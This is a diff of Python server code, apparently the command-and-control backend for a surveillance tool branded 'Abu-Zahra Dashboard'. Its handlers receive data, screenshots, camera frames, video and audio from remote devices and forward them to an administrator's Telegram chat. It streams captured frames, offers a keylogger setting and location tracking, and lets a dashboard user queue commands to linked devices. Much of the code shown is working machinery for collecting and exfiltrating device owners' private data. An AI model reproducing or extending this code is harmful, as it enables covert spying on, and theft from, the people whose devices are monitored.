@@ -1,0 +1,1003 @@
+     1→  2500→        body_data_hash = hashlib.md5(body_data_str[:500].encode()).hexdigest() if body_data_str else ""
+     2→  2501→        
+     3→  2502→        # Skip if same device+command sent same data within 120 seconds
+     4→  2503→        last_body_time = body_dedup_entry.get("time", 0)
+     5→  2504→        last_body_hash = body_dedup_entry.get("hash", "")
+     6→  2505→        if body_data_hash and body_data_hash == last_body_hash and body_dedup_now - last_body_time < 120:
+     7→  2506→            log.info("Data body DEDUP BLOCKED: device=%s cmd=%s hash=%s", device_id, command, body_data_hash[:8])
+     8→  2507→            return web.json_response({"ok": True, "success": True, "message": "Data received (dedup)"})
+     9→  2508→        
+    10→  2509→        # Skip if more than 3 forwards for same device+command within 60 seconds
+    11→  2510→        # (handles cases where data changes slightly each time)
+    12→  2511→        body_dedup_entry.setdefault("recent_times", [])
+    13→  2512→        body_dedup_entry["recent_times"] = [t for t in body_dedup_entry["recent_times"] if body_dedup_now - t < 60]
+    14→  2513→        if len(body_dedup_entry["recent_times"]) >= 3:
+    15→  2514→            log.warning("Data body RATE BLOCKED: device=%s cmd=%s count=%d", device_id, command, len(body_dedup_entry["recent_times"]))
+    16→  2515→            return web.json_response({"ok": True, "success": True, "message": "Data received (rate limited)"})
+    17→  2516→        
+    18→  2517→        # Update dedup record
+    19→  2518→        _data_body_dedup[body_dedup_key] = {
+    20→  2519→            "time": body_dedup_now,
+    21→  2520→            "hash": body_data_hash,
+    22→  2521→            "recent_times": body_dedup_entry["recent_times"] + [body_dedup_now],
+    23→  2522→        }
+    24→  2523→        # Cleanup old entries
+    25→  2524→        expired = [k for k, v in _data_body_dedup.items() if body_dedup_now - v.get("time", 0) > 300]
+    26→  2525→        for k in expired:
+    27→  2526→            del _data_body_dedup[k]
+    28→  2527→        # Clean up old data_forward_dedup entries (older than 5 minutes)
+    29→  2528→        fwd_expired = [k for k, v in _data_forward_dedup.items() if body_dedup_now - v > 300]
+    30→  2529→        for k in fwd_expired:
+    31→  2530→            del _data_forward_dedup[k]
+    32→  2531→
+    33→  2532→        # === FORWARD DATA TO TELEGRAM ===
+    34→  2533→        try:
+    35→  2534→            display_text = ""
+    36→  2535→            if isinstance(data, dict):
+    37→  2536→                if data.get("message"):
+    38→  2537→                    display_text = str(data["message"])
+    39→  2538→                elif data.get("data") is not None:
+    40→  2539→                    inner = data["data"]
+    41→  2540→                    if isinstance(inner, list):
+    42→  2541→                        count = len(inner)
+    43→  2542→                        if count == 0:
+    44→  2543→                            display_text = "لا توجد بيانات"
+    45→  2544→                        elif count <= 15:
+    46→  2545→                            display_text = f"تم بنجاح - {count} عنصر\n\n<code>{json.dumps(inner, ensure_ascii=False, indent=2)[:3000]}</code>"
+    47→  2546→                        else:
+    48→  2547→                            display_text = f"تم بنجاح - {count} عنصر (أول 10)\n\n<code>{json.dumps(inner[:10], ensure_ascii=False, indent=2)[:2000]}</code>\n\n...و {count-10} أخرى"
+    49→  2548→                    elif isinstance(inner, dict):
+    50→  2549→                        display_text = json.dumps(inner, ensure_ascii=False, indent=2)[:3000]
+    51→  2550→                    else:
+    52→  2551→                        display_text = str(inner)[:3000]
+    53→  2552→                elif data.get("ok"):
+    54→  2553→                    display_text = str(data.get("message", "تم بنجاح"))
+    55→  2554→                else:
+    56→  2555→                    display_text = json.dumps(data, ensure_ascii=False, indent=2)[:3000]
+    57→  2556→            elif isinstance(data, str):
+    58→  2557→                display_text = data[:3000]
+    59→  2558→            elif isinstance(data, list):
+    60→  2559→                count = len(data)
+    61→  2560→                if count <= 15:
+    62→  2561→                    display_text = f"{count} عنصر\n<code>{json.dumps(data, ensure_ascii=False, indent=2)[:3000]}</code>"
+    63→  2562→                else:
+    64→  2563→                    display_text = f"{count} عنصر (أول 10)\n<code>{json.dumps(data[:10], ensure_ascii=False, indent=2)[:2000]}</code>"
+    65→  2564→            else:
+    66→  2565→                display_text = str(data)[:3000]
+    67→  2566→
+    68→  2567→            if not display_text:
+    69→  2568→                display_text = "تم الاستلام بنجاح"
+    70→  2569→
+    71→  2570→            cmd_desc = command or "بيانات"
+    72→  2571→            for reg_name, reg_info in COMMAND_REGISTRY.items():
+    73→  2572→                if reg_info.get("cmd") == command:
+    74→  2573→                    cmd_desc = reg_info.get("desc", command)
+    75→  2574→                    break
+    76→  2575→
+    77→  2576→            msg = (
+    78→  2577→                f"📦 <b>بيانات من الجهاز</b>\n\n"
+    79→  2578→                f"📱 الجهاز: <code>{dev_name}</code>\n"
+    80→  2579→                f"📋 النوع: {cmd_desc}\n\n"
+    81→  2580→                f"<code>{display_text}</code>"
+    82→  2581→            )
+    83→  2582→            await send_admin(msg)
+    84→  2583→        except Exception as fwd_err:
+    85→  2584→            log.error("Failed to forward body data to Telegram: %s", fwd_err)
+    86→  2585→
+    87→  2586→        log.info("Data received (body) from %s: command=%s", device_id, command)
+    88→  2587→        return web.json_response({"ok": True, "success": True, "message": "Data received"})
+    89→  2588→    except Exception as exc:
+    90→  2589→        log.error("device_data_body error: %s", exc)
+    91→  2590→        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
+    92→  2591→
+    93→  2592→async def api_device_settings(request):
+    94→  2593→    """GET /api/settings/{device_id} - Get device settings."""
+    95→  2594→    global api_hits
+    96→  2595→    api_hits += 1
+    97→  2596→    device_id = request.match_info.get("device_id", "")
+    98→  2597→    d = find_device(device_id)
+    99→  2598→    if not d:
+   100→  2599→        return web.json_response({"ok": False, "error": "Device not found"}, status=404)
+   101→  2600→    
+   102→  2601→    settings = load_settings()
+   103→  2602→    return web.json_response({
+   104→  2603→        "ok": True,
+   105→  2604→        "settings": {
+   106→  2605→            "sync_interval": settings.get("sync_interval", 300),
+   107→  2606→            "location_interval": settings.get("location_interval", 60),
+   108→  2607→            "auto_location": settings.get("auto_location", True),
+   109→  2608→            "auto_sync": settings.get("auto_sync", True),
+   110→  2609→            "keylogger": settings.get("keylogger", False),
+   111→  2610→            "notifications": settings.get("notifications", True),
+   112→  2611→        }
+   113→  2612→    })
+   114→  2613→
+   115→  2614→
+   116→  2615→async def api_upload_file(request):
+   117→  2616→    """POST /api/upload - Receive files from device (photos, videos, audio, etc.).
+   118→  2617→    يرسل الملفات مباشرة للبوت تليجرام.
+   119→  2618→    Also caches screenshot/camera images for the JPEG streaming viewer."""
+   120→  2619→    global api_hits
+   121→  2620→    api_hits += 1
+   122→  2621→    try:
+   123→  2622→        # Parse multipart form data
+   124→  2623→        reader = await request.multipart()
+   125→  2624→        device_id = None
+   126→  2625→        file_type = "file"
+   127→  2626→        command_id = None
+   128→  2627→        caption = None
+   129→  2628→        file_data = None
+   130→  2629→        file_name = None
+   131→  2630→        file_size = 0
+   132→  2631→        upload_command = ""
+   133→  2632→        
+   134→  2633→        async for field in reader:
+   135→  2634→            if field.filename:
+   136→  2635→                # This is the file field
+   137→  2636→                file_name = field.filename
+   138→  2637→                file_data = await field.read()
+   139→  2638→                file_size = len(file_data)
+   140→  2639→            else:
+   141→  2640→                # Regular field
+   142→  2641→                value = await field.read()
+   143→  2642→                value_str = value.decode('utf-8') if value else ""
+   144→  2643→                if field.name == "device_id":
+   145→  2644→                    device_id = value_str
+   146→  2645→                elif field.name == "file_type":
+   147→  2646→                    file_type = value_str
+   148→  2647→                elif field.name == "command":
+   149→  2648→                    upload_command = value_str
+   150→  2649→                    # Use command as file_type hint if file_type not set
+   151→  2650→                    if value_str in ("screenshot", "camera", "photo"):
+   152→  2651→                        file_type = value_str
+   153→  2652→                elif field.name == "command_id":
+   154→  2653→                    command_id = value_str
+   155→  2654→                elif field.name == "caption":
+   156→  2655→                    caption = value_str
+   157→  2656→        
+   158→  2657→        if not file_data:
+   159→  2658→            return web.json_response({"ok": False, "error": "No file received"}, status=400)
+   160→  2659→        
+   161→  2660→        # If no device_id, try to identify by client IP
+   162→  2661→        if not device_id:
+   163→  2662→            peer_ip = _get_real_ip(request)
+   164→  2663→            if peer_ip and peer_ip in _ip_device_map:
+   165→  2664→                device_id = _ip_device_map[peer_ip]
+   166→  2665→                log.info("Upload: identified device %s by IP %s", device_id, peer_ip)
+   167→  2666→        
+   168→  2667→        # Still no device_id - accept but can't attribute
+   169→  2668→        if not device_id:
+   170→  2669→            device_id = "unknown"
+   171→  2670→            log.warning("Upload received without device_id and unknown IP %s", request.remote)
+   172→  2671→        
+   173→  2672→        # Validate device token (use IP-based lookup if no token header)
+   174→  2673→        device_token = request.headers.get("X-Device-Token", "")
+   175→  2674→        if device_token:
+   176→  2675→            d = get_device_by_token(device_id, device_token)
+   177→  2676→            if not d:
+   178→  2677→                return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
+   179→  2678→        else:
+   180→  2679→            # Fallback: IP-based identification already done above
+   181→  2680→            d = find_device(device_id) if device_id != "unknown" else None
+   182→  2681→        
+   183→  2682→        dev_name = (d.get("name", device_id) if d else device_id) if device_id != "unknown" else "Unknown"
+   184→  2683→        if device_id != "unknown":
+   185→  2684→            await update_device(device_id, {"active": True})
+   186→  2685→        
+   187→  2686→        # === CACHE IMAGE FOR STREAMING VIEWER ===
+   188→  2687→        if file_type in ("screenshot", "camera", "photo") and device_id != "unknown" and len(file_data) > 1000:
+   189→  2688→            try:
+   190→  2689→                import base64 as b64mod
+   191→  2690→                frame_b64 = b64mod.b64encode(file_data).decode('ascii')
+   192→  2691→                frame_key = f"{device_id}:video"
+   193→  2692→                _latest_frames_module[frame_key] = {
+   194→  2693→                    "data": frame_b64,
+   195→  2694→                    "timestamp": time.time(),
+   196→  2695→                    "size": file_size,
+   197→  2696→                    "source": file_type,
+   198→  2697→                    "stream_id": device_id,
+   199→  2698→                    "is_keyframe": True,
+   200→  2699→                    "codec": "jpeg",
+   201→  2700→                }
+   202→  2701→                log.info("Cached %s frame for streaming: device=%s size=%d", file_type, device_id, file_size)
+   203→  2702→            except Exception as cache_err:
+   204→  2703→                log.error("Failed to cache frame: %s", cache_err)
+   205→  2704→        
+   206→  2705→        # Save file temporarily
+   207→  2706→        upload_dir = DATA_DIR / "uploads"
+   208→  2707→        upload_dir.mkdir(parents=True, exist_ok=True)
+   209→  2708→        
+   210→  2709→        safe_name = "".join(c if c.isalnum() or c in "._-" else "_" for c in (file_name or f"{file_type}_{int(time.time())}"))
+   211→  2710→        temp_path = upload_dir / f"{device_id}_{safe_name}"
+   212→  2711→        temp_path.write_bytes(file_data)
+   213→  2712→        
+   214→  2713→        log.info("File uploaded: %s (%d bytes) from device %s", file_name, file_size, device_id)
+   215→  2714→        append_event("File uploaded", {"device_id": device_id, "file": file_name, "type": file_type, "size": file_size})
+   216→  2715→        
+   217→  2716→        # Send to Telegram based on file type (skip if JPEG streaming to avoid spam)
+   218→  2717→        is_stream_frame = file_type in ("screenshot", "camera", "photo") and _jpeg_stream_info.get(device_id, {}).get("active", False)
+   219→  2718→        if not is_stream_frame:
+   220→  2719→            try:
+   221→  2720→                if file_type in ("photo", "screenshot", "camera"):
+   222→  2721→                    await tg_send_photo(ADMIN_CHAT_ID, temp_path, caption=f"📷 {file_type}\n📱 الجهاز: {dev_name}\n📁 {file_name}")
+   223→  2722→                elif file_type == "video":
+   224→  2723→                    await tg_send_video(ADMIN_CHAT_ID, temp_path, caption=f"🎬 فيديو\n📱 الجهاز: {dev_name}\n📁 {file_name}")
+   225→  2724→                elif file_type == "audio":
+   226→  2725→                    await tg_send_audio(ADMIN_CHAT_ID, temp_path, caption=f"🎙️ صوت\n📱 الجهاز: {dev_name}\n📁 {file_name}")
+   227→  2726→                else:
+   228→  2727→                    await tg_send_document(ADMIN_CHAT_ID, temp_path, caption=f"📄 ملف\n📱 الجهاز: {dev_name}\n📁 {file_name}")
+   229→  2728→                log.info("File sent to Telegram: %s", file_name)
+   230→  2729→            except Exception as tg_err:
+   231→  2730→                log.error("Failed to send file to Telegram: %s", tg_err)
+   232→  2731→        
+   233→  2732→        return web.json_response({
+   234→  2733→            "ok": True, 
+   235→  2734→            "success": True, 
+   236→  2735→            "message": "File uploaded successfully",
+   237→  2736→            "file_name": file_name,
+   238→  2737→            "file_size": file_size
+   239→  2738→        })
+   240→  2739→    except Exception as exc:
+   241→  2740→        log.error("upload_file error: %s", exc)
+   242→  2741→        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
+   243→  2742→
+   244→  2743→
+   245→  2744→async def api_upload_base64(request):
+   246→  2745→    """POST /api/upload_base64 - Receive base64-encoded files from device.
+   247→  2746→    للصور الصغيرة ولقطات الشاشة."""
+   248→  2747→    global api_hits
+   249→  2748→    api_hits += 1
+   250→  2749→    try:
+   251→  2750→        body = await request.json()
+   252→  2751→        device_id = body.get("device_id", "")
+   253→  2752→        file_type = body.get("file_type", "photo")
+   254→  2753→        base64_data = body.get("base64_data", "")
+   255→  2754→        command_id = body.get("command_id")
+   256→  2755→        caption = body.get("caption")
+   257→  2756→        
+   258→  2757→        if not device_id:
+   259→  2758→            return web.json_response({"ok": False, "error": "device_id required"}, status=400)
+   260→  2759→        
+   261→  2760→        if not base64_data:
+   262→  2761→            return web.json_response({"ok": False, "error": "No base64 data provided"}, status=400)
+   263→  2762→        
+   264→  2763→        # Validate device token
+   265→  2764→        device_token = request.headers.get("X-Device-Token", "")
+   266→  2765→        d = get_device_by_token(device_id, device_token)
+   267→  2766→        if not d:
+   268→  2767→            return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
+   269→  2768→        
+   270→  2769→        dev_name = d.get("name", device_id)
+   271→  2770→        await update_device(device_id, {"active": True})
+   272→  2771→        
+   273→  2772→        # Decode base64
+   274→  2773→        import base64
+   275→  2774→        try:
+   276→  2775→            # Remove data URL prefix if present
+   277→  2776→            if base64_data.startswith("data:"):
+   278→  2777→                base64_data = base64_data.split(",", 1)[1]
+   279→  2778→            file_bytes = base64.b64decode(base64_data)
+   280→  2779→        except Exception as decode_err:
+   281→  2780→            return web.json_response({"ok": False, "error": f"Invalid base64: {decode_err}"}, status=400)
+   282→  2781→        
+   283→  2782→        # Save file
+   284→  2783→        upload_dir = DATA_DIR / "uploads"
+   285→  2784→        upload_dir.mkdir(parents=True, exist_ok=True)
+   286→  2785→        
+   287→  2786→        ext = "png" if file_type in ("photo", "screenshot") else "jpg"
+   288→  2787→        file_name = f"{file_type}_{int(time.time())}.{ext}"
+   289→  2788→        temp_path = upload_dir / f"{device_id}_{file_name}"
+   290→  2789→        temp_path.write_bytes(file_bytes)
+   291→  2790→        
+   292→  2791→        log.info("Base64 file uploaded: %s (%d bytes) from device %s", file_name, len(file_bytes), device_id)
+   293→  2792→        append_event("Base64 file uploaded", {"device_id": device_id, "file": file_name, "type": file_type})
+   294→  2793→        
+   295→  2794→        # Send to Telegram
+   296→  2795→        try:
+   297→  2796→            caption_text = f"📷 {file_type}\n📱 الجهاز: {dev_name}"
+   298→  2797→            if caption:
+   299→  2798→                caption_text += f"\n{caption}"
+   300→  2799→            await tg_send_photo(ADMIN_CHAT_ID, temp_path, caption=caption_text)
+   301→  2800→            log.info("Base64 file sent to Telegram: %s", file_name)
+   302→  2801→        except Exception as tg_err:
+   303→  2802→            log.error("Failed to send base64 file to Telegram: %s", tg_err)
+   304→  2803→        
+   305→  2804→        return web.json_response({
+   306→  2805→            "ok": True, 
+   307→  2806→            "success": True, 
+   308→  2807→            "message": "File uploaded and sent to Telegram",
+   309→  2808→            "file_name": file_name
+   310→  2809→        })
+   311→  2810→    except Exception as exc:
+   312→  2811→        log.error("upload_base64 error: %s", exc)
+   313→  2812→        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
+   314→  2813→
+   315→  2814→
+   316→  2815→async def tg_send_photo(chat_id, file_path, caption=None):
+   317→  2816→    """Send photo to Telegram."""
+   318→  2817→    try:
+   319→  2818→        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+   320→  2819→        with open(file_path, "rb") as f:
+   321→  2820→            data = aiohttp.FormData()
+   322→  2821→            data.add_field("chat_id", str(chat_id))
+   323→  2822→            data.add_field("photo", f, filename=file_path.name, content_type="image/jpeg")
+   324→  2823→            if caption:
+   325→  2824→                data.add_field("caption", caption[:1024])
+   326→  2825→                data.add_field("parse_mode", "HTML")
+   327→  2826→            
+   328→  2827→            session = get_tg_session()
+   329→  2828→            async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=60)) as resp:
+   330→  2829→                if resp.status == 200:
+   331→  2830→                    return await resp.json()
+   332→  2831→                else:
+   333→  2832→                    error_text = await resp.text()
+   334→  2833→                    log.error("Failed to send photo: %s", error_text[:500])
+   335→  2834→                    return None
+   336→  2835→    except Exception as e:
+   337→  2836→        log.error("tg_send_photo error: %s", e)
+   338→  2837→        return None
+   339→  2838→
+   340→  2839→
+   341→  2840→async def tg_send_video(chat_id, file_path, caption=None):
+   342→  2841→    """Send video to Telegram."""
+   343→  2842→    try:
+   344→  2843→        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
+   345→  2844→        with open(file_path, "rb") as f:
+   346→  2845→            data = aiohttp.FormData()
+   347→  2846→            data.add_field("chat_id", str(chat_id))
+   348→  2847→            data.add_field("video", f, filename=file_path.name, content_type="video/mp4")
+   349→  2848→            if caption:
+   350→  2849→                data.add_field("caption", caption[:1024])
+   351→  2850→                data.add_field("parse_mode", "HTML")
+   352→  2851→            
+   353→  2852→            session = get_tg_session()
+   354→  2853→            async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=120)) as resp:
+   355→  2854→                if resp.status == 200:
+   356→  2855→                    return await resp.json()
+   357→  2856→                else:
+   358→  2857→                    error_text = await resp.text()
+   359→  2858→                    log.error("Failed to send video: %s", error_text[:500])
+   360→  2859→                    return None
+   361→  2860→    except Exception as e:
+   362→  2861→        log.error("tg_send_video error: %s", e)
+   363→  2862→        return None
+   364→  2863→
+   365→  2864→
+   366→  2865→async def tg_send_audio(chat_id, file_path, caption=None):
+   367→  2866→    """Send audio to Telegram."""
+   368→  2867→    try:
+   369→  2868→        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
+   370→  2869→        with open(file_path, "rb") as f:
+   371→  2870→            data = aiohttp.FormData()
+   372→  2871→            data.add_field("chat_id", str(chat_id))
+   373→  2872→            data.add_field("audio", f, filename=file_path.name, content_type="audio/mpeg")
+   374→  2873→            if caption:
+   375→  2874→                data.add_field("caption", caption[:1024])
+   376→  2875→                data.add_field("parse_mode", "HTML")
+   377→  2876→            
+   378→  2877→            session = get_tg_session()
+   379→  2878→            async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=60)) as resp:
+   380→  2879→                if resp.status == 200:
+   381→  2880→                    return await resp.json()
+   382→  2881→                else:
+   383→  2882→                    error_text = await resp.text()
+   384→  2883→                    log.error("Failed to send audio: %s", error_text[:500])
+   385→  2884→                    return None
+   386→  2885→    except Exception as e:
+   387→  2886→        log.error("tg_send_audio error: %s", e)
+   388→  2887→        return None
+   389→  2888→
+   390→  2889→
+   391→  2890→async def tg_send_document(chat_id, file_path, caption=None):
+   392→  2891→    """Send document to Telegram."""
+   393→  2892→    try:
+   394→  2893→        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+   395→  2894→        with open(file_path, "rb") as f:
+   396→  2895→            data = aiohttp.FormData()
+   397→  2896→            data.add_field("chat_id", str(chat_id))
+   398→  2897→            data.add_field("document", f, filename=file_path.name)
+   399→  2898→            if caption:
+   400→  2899→                data.add_field("caption", caption[:1024])
+   401→  2900→                data.add_field("parse_mode", "HTML")
+   402→  2901→            
+   403→  2902→            session = get_tg_session()
+   404→  2903→            async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=60)) as resp:
+   405→  2904→                if resp.status == 200:
+   406→  2905→                    return await resp.json()
+   407→  2906→                else:
+   408→  2907→                    error_text = await resp.text()
+   409→  2908→                    log.error("Failed to send document: %s", error_text[:500])
+   410→  2909→                    return None
+   411→  2910→    except Exception as e:
+   412→  2911→        log.error("tg_send_document error: %s", e)
+   413→  2912→        return None
+   414→  2913→
+   415→  2914→
+   416→  2915→async def api_web_login(request):
+   417→  2916→    """POST /api/login - Web dashboard login."""
+   418→  2917→    global api_hits
+   419→  2918→    api_hits += 1
+   420→  2919→    try:
+   421→  2920→        body = await request.json()
+   422→  2921→        username = body.get("username", "admin")
+   423→  2922→        password = body.get("password", "")
+   424→  2923→        ip = request.remote or ""
+   425→  2924→        ua = request.headers.get("User-Agent", "")
+   426→  2925→        
+   427→  2926→        session = await create_session(username, password, ip, ua)
+   428→  2927→        if not session:
+   429→  2928→            return web.json_response({"ok": False, "error": "Invalid credentials"}, status=401)
+   430→  2929→        
+   431→  2930→        return web.json_response({
+   432→  2931→            "ok": True,
+   433→  2932→            "token": session["token"],
+   434→  2933→            "expires_at": session["expires_at"],
+   435→  2934→        })
+   436→  2935→    except Exception as exc:
+   437→  2936→        log.error("login error: %s", exc)
+   438→  2937→        return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
+   439→  2938→
+   440→  2939→
+   441→  2940→async def api_web_logout(request):
+   442→  2941→    token = request.headers.get("Authorization", "").replace("Bearer ", "")
+   443→  2942→    if token:
+   444→  2943→        sessions = load_json(SESSIONS_FILE, [])
+   445→  2944→        sessions = [s for s in sessions if s.get("token") != token]
+   446→  2945→        save_json(SESSIONS_FILE, sessions)
+   447→  2946→    return web.json_response({"ok": True})
+   448→  2947→
+   449→  2948→
+   450→  2949→def require_auth(func):
+   451→  2950→    """Decorator to require valid session token."""
+   452→  2951→    async def wrapper(request, *args, **kwargs):
+   453→  2952→        global api_hits
+   454→  2953→        api_hits += 1
+   455→  2954→        auth = request.headers.get("Authorization", "")
+   456→  2955→        token = auth.replace("Bearer ", "") if auth.startswith("Bearer ") else ""
+   457→  2956→        if not token:
+   458→  2957→            return web.json_response({"ok": False, "error": "Unauthorized"}, status=401)
+   459→  2958→        session = validate_session(token)
+   460→  2959→        if not session:
+   461→  2960→            return web.json_response({"ok": False, "error": "Session expired"}, status=401)
+   462→  2961→        request["session"] = session
+   463→  2962→        return await func(request, *args, **kwargs)
+   464→  2963→    return wrapper
+   465→  2964→
+   466→  2965→
+   467→  2966→@require_auth
+   468→  2967→async def api_web_devices(request):
+   469→  2968→    devices = get_devices()
+   470→  2969→    return web.json_response({"ok": True, "devices": devices})
+   471→  2970→
+   472→  2971→
+   473→  2972→@require_auth
+   474→  2973→async def api_web_device_detail(request):
+   475→  2974→    device_id = request.match_info.get("device_id", "")
+   476→  2975→    d = find_device(device_id)
+   477→  2976→    if not d:
+   478→  2977→        return web.json_response({"ok": False, "error": "Not found"}, status=404)
+   479→  2978→    cmds = load_json(COMMANDS_FILE, [])
+   480→  2979→    device_cmds = [c for c in cmds if c.get("device_id") == device_id][-50:]
+   481→  2980→    return web.json_response({"ok": True, "device": d, "commands": device_cmds})
+   482→  2981→
+   483→  2982→
+   484→  2983→@require_auth
+   485→  2984→async def api_web_commands(request):
+   486→  2985→    commands = load_json(COMMANDS_FILE, [])
+   487→  2986→    return web.json_response({"ok": True, "commands": commands[-100:]})
+   488→  2987→
+   489→  2988→
+   490→  2989→@require_auth
+   491→  2990→async def api_web_events(request):
+   492→  2991→    events = load_json(EVENTS_FILE, [])
+   493→  2992→    return web.json_response({"ok": True, "events": events[-100:]})
+   494→  2993→
+   495→  2994→
+   496→  2995→@require_auth
+   497→  2996→async def api_web_stats(request):
+   498→  2997→    devices = get_devices()
+   499→  2998→    online = sum(1 for d in devices if d.get("active"))
+   500→  2999→    cmds = load_json(COMMANDS_FILE, [])
+   501→  3000→    pending = sum(1 for c in cmds if c.get("status") == "pending")
+   502→  3001→    completed = sum(1 for c in cmds if c.get("status") == "completed")
+   503→  3002→    events = load_json(EVENTS_FILE, [])
+   504→  3003→    return web.json_response({
+   505→  3004→        "ok": True,
+   506→  3005→        "stats": {
+   507→  3006→            "uptime": get_uptime(),
+   508→  3007→            "uptime_formatted": format_uptime(get_uptime()),
+   509→  3008→            "devices_total": len(devices),
+   510→  3009→            "devices_online": online,
+   511→  3010→            "commands_total": len(cmds),
+   512→  3011→            "commands_pending": pending,
+   513→  3012→            "commands_completed": completed,
+   514→  3013→            "messages_sent": messages_sent,
+   515→  3014→            "api_hits": api_hits,
+   516→  3015→            "events_total": len(events),
+   517→  3016→            "total_registered_commands": len(COMMAND_REGISTRY),
+   518→  3017→            "server_time": ts(),
+   519→  3018→            "port": SERVER_PORT,
+   520→  3019→            "domain": SERVER_DOMAIN,
+   521→  3020→        }
+   522→  3021→    })
+   523→  3022→
+   524→  3023→
+   525→  3024→@require_auth
+   526→  3025→async def api_web_send_command(request):
+   527→  3026→    try:
+   528→  3027→        body = await request.json()
+   529→  3028→        device_id = body.get("device_id", "")
+   530→  3029→        command = body.get("command", "")
+   531→  3030→        params = body.get("params", {})
+   532→  3031→        
+   533→  3032→        if not device_id or not command:
+   534→  3033→            return web.json_response({"ok": False, "error": "device_id and command required"}, status=400)
+   535→  3034→        
+   536→  3035→        d = find_device(device_id)
+   537→  3036→        if not d:
+   538→  3037→            return web.json_response({"ok": False, "error": "Device not found"}, status=404)
+   539→  3038→        
+   540→  3039→        cmd = await queue_command(device_id, command, params)
+   541→  3040→        return web.json_response({"ok": True, "command": cmd})
+   542→  3041→    except Exception as exc:
+   543→  3042→        log.error("web queue command error: %s", exc)
+   544→  3043→        return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
+   545→  3044→
+   546→  3045→
+   547→  3046→@require_auth
+   548→  3047→async def api_web_link_code(request):
+   549→  3048→    entry = await generate_link_code()
+   550→  3049→    return web.json_response({"ok": True, "code": entry["code"], "session_id": entry.get("session_id", "")})
+   551→  3050→
+   552→  3051→
+   553→  3052→@require_auth
+   554→  3053→async def api_web_settings_get(request):
+   555→  3054→    settings = load_settings()
+   556→  3055→    return web.json_response({"ok": True, "settings": settings})
+   557→  3056→
+   558→  3057→
+   559→  3058→@require_auth
+   560→  3059→async def api_web_settings_set(request):
+   561→  3060→    try:
+   562→  3061→        body = await request.json()
+   563→  3062→        settings = load_settings()
+   564→  3063→        for key, value in body.items():
+   565→  3064→            if key in settings:
+   566→  3065→                settings[key] = value
+   567→  3066→        await save_settings_data(settings)
+   568→  3067→        return web.json_response({"ok": True})
+   569→  3068→    except Exception as exc:
+   570→  3069→        log.error("web settings error: %s", exc)
+   571→  3070→        return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
+   572→  3071→
+   573→  3072→
+   574→  3073→@require_auth
+   575→  3074→async def api_web_unlink(request):
+   576→  3075→    device_id = request.match_info.get("device_id", "")
+   577→  3076→    if await remove_device(device_id):
+   578→  3077→        return web.json_response({"ok": True})
+   579→  3078→    return web.json_response({"ok": False, "error": "Not found"}, status=404)
+   580→  3079→
+   581→  3080→# ============================================================================
+   582→  3081→# WEB DASHBOARD HTML
+   583→  3082→# ============================================================================
+   584→  3083→
+   585→  3084→DASHBOARD_HTML = r"""<!DOCTYPE html>
+   586→  3085→<html lang="ar" dir="rtl">
+   587→  3086→<head>
+   588→  3087→<meta charset="UTF-8">
+   589→  3088→<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+   590→  3089→<title>Abu-Zahra Dashboard</title>
+   591→  3090→<style>
+   592→  3091→/* ========== CSS Custom Properties / Theme ========== */
+   593→  3092→:root {
+   594→  3093→  --bg: #0d1117;
+   595→  3094→  --bg-light: #161b22;
+   596→  3095→  --surface: #1c2128;
+   597→  3096→  --surface2: #21262d;
+   598→  3097→  --surface-hover: #292e36;
+   599→  3098→  --border: #30363d;
+   600→  3099→  --border-light: #484f58;
+   601→  3100→  --text: #e6edf3;
+   602→  3101→  --text-secondary: #8b949e;
+   603→  3102→  --text-muted: #656d76;
+   604→  3103→  --accent: #e63946;
+   605→  3104→  --accent-hover: #ff4d5a;
+   606→  3105→  --green: #3fb950;
+   607→  3106→  --green-bg: rgba(63,185,80,.12);
+   608→  3107→  --red: #f85149;
+   609→  3108→  --red-bg: rgba(248,81,73,.12);
+   610→  3109→  --yellow: #d29922;
+   611→  3110→  --yellow-bg: rgba(210,153,34,.12);
+   612→  3111→  --blue: #58a6ff;
+   613→  3112→  --blue-bg: rgba(88,166,255,.12);
+   614→  3113→  --purple: #bc8cff;
+   615→  3114→  --purple-bg: rgba(188,140,255,.12);
+   616→  3115→  --orange: #f0883e;
+   617→  3116→  --radius: 12px;
+   618→  3117→  --radius-sm: 8px;
+   619→  3118→  --radius-xs: 6px;
+   620→  3119→  --shadow: 0 1px 3px rgba(0,0,0,.3), 0 1px 2px rgba(0,0,0,.2);
+   621→  3120→  --shadow-lg: 0 10px 25px rgba(0,0,0,.4);
+   622→  3121→  --transition: .2s cubic-bezier(.4,0,.2,1);
+   623→  3122→  --sidebar-width: 260px;
+   624→  3123→  --topbar-height: 56px;
+   625→  3124→}
+   626→  3125→*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+   627→  3126→html{-webkit-text-size-adjust:100%}
+   628→  3127→body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Tahoma,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;line-height:1.5;-webkit-font-smoothing:antialiased}
+   629→  3128→::-webkit-scrollbar{width:6px;height:6px}
+   630→  3129→::-webkit-scrollbar-track{background:var(--bg)}
+   631→  3130→::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:3px}
+   632→  3131→::-webkit-scrollbar-thumb:hover{background:var(--text-muted)}
+   633→  3132→input,select,textarea,button{font-family:inherit}
+   634→  3133→a{text-decoration:none;color:inherit}
+   635→  3134→
+   636→  3135→/* ========== Login ========== */
+   637→  3136→.login-page{display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,var(--bg) 0%,#1a1a2e 50%,#16213e 100%);position:relative;overflow:hidden}
